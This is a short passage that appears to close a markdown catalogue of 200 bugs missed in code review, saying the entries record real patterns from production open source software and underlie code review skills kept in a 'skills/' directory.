appropriate for their purpose?"

---

## Total: 200 bugs missed in code review

Each entry documents a real pattern that has occurred in production open source software.
The review patterns extracted from these bugs form the basis of the code review skills
in the `skills/` directory.
